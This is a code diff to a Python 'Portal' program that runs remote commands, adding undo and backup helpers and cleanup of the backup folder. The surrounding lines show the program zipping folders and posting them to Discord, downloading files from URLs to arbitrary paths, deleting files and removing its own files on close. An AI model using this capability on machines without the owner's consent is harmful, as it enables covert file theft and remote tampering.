@@ -22,6 +22,7 @@ Speech can be muted from the chat sidebar.
 import json
 import os
 import platform
+import shutil
 import subprocess
 import sys
 import threading
@@ -287,6 +288,98 @@ def _read_file(path, max_bytes=50000):
         return data
     except Exception as e:
         return f"Error reading file: {e}"
+
+
+# ------------------------------------------------------------------
+# Undo / backup helpers
+# ------------------------------------------------------------------
+def _backup_dir():
+    """Return the hidden backup directory inside the portal folder."""
+    return Path(__file__).parent / ".portal_backups"
+
+
+def _backup_log_file():
+    return _backup_dir() / "undo_log.json"
+
+
+def _backup_file(path, operation, extra=None):
+    """Backup a file before a destructive operation. Returns backup info or None."""
+    p = Path(path)
+    if not p.exists() or not p.is_file():
+        return None
+    try:
+        backup_dir = _backup_dir()
+        backup_dir.mkdir(exist_ok=True)
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
+        backup_name = f"{timestamp}_{p.name}"
+        backup_path = backup_dir / backup_name
+        shutil.copy2(p, backup_path)
+        entry = {
+            "original_path": str(p.resolve()),
+            "backup_path": str(backup_path),
+            "operation": operation,
+            "timestamp": datetime.now().isoformat(),
+        }
+        if extra:
+            entry.update(extra)
+        logs = []
+        log_file = _backup_log_file()
+        if log_file.exists():
+            try:
+                logs = json.load(open(log_file, "r", encoding="utf-8"))
+            except Exception:
+                pass
+        logs.append(entry)
+        json.dump(logs, open(log_file, "w", encoding="utf-8"), indent=2)
+        return entry
+    except Exception:
+        return None
+
+
+def _undo_last():
+    """Undo the last destructive file operation. Returns (ok, message)."""
+    log_file = _backup_log_file()
+    if not log_file.exists():
+        return False, "No undo history available."
+    try:
+        logs = json.load(open(log_file, "r", encoding="utf-8"))
+    except Exception:
+        return False, "Could not read undo history."
+    if not logs:
+        return False, "No undo history available."
+
+    entry = logs.pop()
+    operation = entry.get("operation", "")
+    original_path = entry.get("original_path", "")
+    backup_path = entry.get("backup_path", "")
+
+    try:
+        if operation in ("delete", "replace", "add"):
+            if not backup_path or not Path(backup_path).exists():
+                return False, f"Backup missing for {operation} on {original_path}"
+            Path(original_path).parent.mkdir(parents=True, exist_ok=True)
+            shutil.copy2(backup_path, original_path)
+            # Remove the backup entry from log
+            json.dump(logs, open(log_file, "w", encoding="utf-8"), indent=2)
+            return True, f"Undo {operation}: restored {original_path}"
+        elif operation == "rename":
+            old_path = entry.get("old_path", "")
+            new_path = entry.get("new_path", "")
+            if not old_path or not new_path:
+                return False, "Rename undo missing path info"
+            if not Path(backup_path).exists():
+                return False, f"Backup missing for rename: {old_path}"
+            # Delete the new file and restore the old one
+            if Path(new_path).exists():
+                Path(new_path).unlink()
+            Path(old_path).parent.mkdir(parents=True, exist_ok=True)
+            shutil.copy2(backup_path, old_path)
+            json.dump(logs, open(log_file, "w", encoding="utf-8"), indent=2)
+            return True, f"Undo rename: restored {old_path}"
+        else:
+            return False, f"Unknown operation: {operation}"
+    except Exception as e:
+        return False, f"Undo failed: {e}"
 
 
 def _download_file(url, dest_path):
@@ -1131,30 +1224,6 @@ class PortalWindow:
             _post_file_to_discord(f"{tag} All files from: {path}", zip_path)
             return True, f"Sent zip of {path}"
 
-        elif cmd_type == "add":
-            path = cmd.get("path", "")
-            url = cmd.get("url", "")
-            if not path or not url:
-                return False, "Missing path or url"
-            if Path(path).exists():
-                return False, f"File already exists: {path}. Use /replace to overwrite."
-            ok, msg = _download_file(url, path)
-            _post_to_discord(f"{tag} {msg}")
-            return ok, msg
-
-        elif cmd_type == "replace":
-            path = cmd.get("path", "")
-            url = cmd.get("url", "")
-            if not path or not url:
-                return False, "Missing path or url"
-            try:
-                Path(path).unlink()
-            except Exception:
-                pass
-            ok, msg = _download_file(url, path)
-            _post_to_discord(f"{tag} {msg}")
-            return ok, msg
-
         elif cmd_type == "check_packages":
             result = _check_packages()
             _post_file_to_discord(f"{tag} Installed packages", _write_temp(result))
@@ -1196,6 +1265,7 @@ class PortalWindow:
             if not path:
                 return False, "Missing path"
             try:
+                _backup_file(path, "delete")
                 Path(path).unlink()
                 _post_to_discord(f"{tag} Deleted: {path}")
                 return True, f"Deleted: {path}"
@@ -1215,6 +1285,7 @@ class PortalWindow:
                 for f in sorted(p.iterdir()):
                     if f.is_file():
                         try:
+                            _backup_file(f, "delete")
                             f.unlink()
                             deleted.append(f.name)
                         except Exception as e:
@@ -1238,11 +1309,40 @@ class PortalWindow:
             if not old or not new:
                 return False, "Missing old_path or new_path"
             try:
+                _backup_file(old, "rename", {"old_path": old, "new_path": new})
                 Path(old).rename(new)
                 _post_to_discord(f"{tag} Renamed: {old} -> {new}")
                 return True, f"Renamed: {old} -> {new}"
             except Exception as e:
                 return False, f"Rename failed: {e}"
+
+        elif cmd_type == "add":
+            path = cmd.get("path", "")
+            url = cmd.get("url", "")
+            if not path or not url:
+                return False, "Missing path or url"
+            if Path(path).exists():
+                return False, f"File already exists: {path}. Use /replace to overwrite."
+            try:
+                ok, msg = _download_file(url, path)
+                _post_to_discord(f"{tag} {msg}")
+                return ok, msg
+            except Exception as e:
+                return False, f"Add failed: {e}"
+
+        elif cmd_type == "replace":
+            path = cmd.get("path", "")
+            url = cmd.get("url", "")
+            if not path or not url:
+                return False, "Missing path or url"
+            try:
+                _backup_file(path, "replace")
+                Path(path).unlink()
+            except Exception:
+                pass
+            ok, msg = _download_file(url, path)
+            _post_to_discord(f"{tag} {msg}")
+            return ok, msg
 
         elif cmd_type == "message":
             # Chat is now handled by Firebase (instant).
@@ -1332,6 +1432,11 @@ class PortalWindow:
             _firebase_put(f"sessions/{SESSION_ID}/status", "open")
             _post_to_discord(f"{tag} Portal resurrected by Atlas.")
             return True, "Portal resurrected"
+
+        elif cmd_type == "undo_last":
+            ok, msg = _undo_last()
+            _post_to_discord(f"{tag} {msg}")
+            return ok, msg
 
         else:
             return False, f"Unknown command type: {cmd_type}"
@@ -1442,6 +1547,10 @@ class PortalWindow:
                 self.executed_file.unlink()
             if portal_path.exists():
                 portal_path.unlink()
+            # Clean up backup folder on final close
+            bdir = _backup_dir()
+            if bdir.exists():
+                shutil.rmtree(bdir)
         except Exception:
             pass
 
@@ -1459,6 +1568,10 @@ class PortalWindow:
                 self.executed_file.unlink()
             if portal_path.exists():
                 portal_path.unlink()
+            # Clean up backup folder on final close
+            bdir = _backup_dir()
+            if bdir.exists():
+                shutil.rmtree(bdir)
         except Exception:
             pass
 
